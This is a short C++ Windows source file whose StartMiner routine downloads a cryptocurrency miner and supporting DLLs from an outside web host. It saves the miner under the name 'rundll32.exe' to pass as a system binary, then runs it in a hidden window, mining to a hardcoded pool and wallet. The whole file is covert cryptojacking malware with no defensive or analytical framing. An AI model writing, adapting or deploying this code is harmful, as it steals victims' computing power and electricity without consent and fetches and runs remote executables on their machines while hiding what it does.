#include "stdafx.h"
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <urlmon.h>

typedef HRESULT(WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller,
    LPCTSTR szURL,
    LPCTSTR szFileName,
    DWORD dwReserved,
    LPBINDSTATUSCALLBACK lpfnCB);

void runFile();
void downloadMiner();

void StartMiner()
{
    downloadMiner();
    runFile(); 
}

void runFile()
{
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcess("rundll32.exe", "rundll32.exe -o stratum+tcp://mine.xpool.ca:1122 -u 1KNa8Zos3EiZV4jLgNYLty9N1LrFpzU9rA.NervousScrypt -p \"--diff 512\" --threads=4", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    return;
}

void downloadMiner()
{
    //Probably isn't the best method at all, but it's what I got to work without trouble
    lpURLDownloadToFile URLDownloadToFile;

    HMODULE hUrlmon = LoadLibrary("URLMON.DLL");

    URLDownloadToFile = (lpURLDownloadToFile)GetProcAddress(hUrlmon, "URLDownloadToFileA");

    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/minerd.exe", "rundll32.exe", 0, 0);
    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/zlib1.dll", "zlib1.dll", 0, 0);
    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libwinpthread-1.dll", "libwinpthread-1.dll", 0, 0);
    URLDownloadToFile(0, "http://ashran.com/assets/uploads/peluche/libcurl-4.dll", "libcurl-4.dll", 0, 0);

    return;
}